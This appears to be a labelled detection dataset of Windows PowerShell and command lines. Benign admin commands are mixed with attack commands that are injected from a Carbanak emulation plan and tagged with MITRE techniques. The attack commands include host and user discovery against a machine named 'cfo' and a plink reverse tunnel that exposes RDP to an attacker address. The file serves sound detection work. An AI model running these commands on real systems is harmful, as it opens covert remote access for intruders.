Get-ADComputer -Identity 'cfo' -Properties *     // GROUND-TRUTH : T1018: Remote System Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
Copy-Item C:\Windows\System32\*.* C:\Backup -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
Test-Path -Path 'C:\Windows\System32\drivers\etc\hosts'     // LABEL: BENIGN-POWERSHELL-COMMAND
Move-Item plink.exe C:\Windows\Temp\plink.exe;
echo n | C:\Windows\Temp\plink.exe -pw "#{attacker.sshuser.password}" #{attacker.sshuser.username}@192.168.0.4 -R 3389:localhost:3389     // GROUND-TRUTH : T1572: Protocol Tunneling (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
Copy-Item C:\Windows\System32\drivers\*.sys C:\Backup -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
qwinsta /server:cfo     // GROUND-TRUTH : T1033: System Owner/User Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
Set-ExecutionPolicy Bypass -Scope Process -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
Copy-Item C:\Logs\*.log C:\Backup\Logs -Recurse -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
New-Item C:\temp\benign_script.ps1 -Type File -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -ErrorAction SilentlyContinue | ForEach-Object { if ($_.DisableTaskMgr -eq 1) { Write-Output 'Task Manager can be disabled.' } else { Write-Output 'Task Manager cannot be disabled.' } }     // LABEL: BENIGN-POWERSHELL-COMMAND
Invoke-Sqlcmd -Query 'SELECT * FROM Users' -Database 'MyDB' -ServerInstance 'localhost'     // LABEL: BENIGN-POWERSHELL-COMMAND
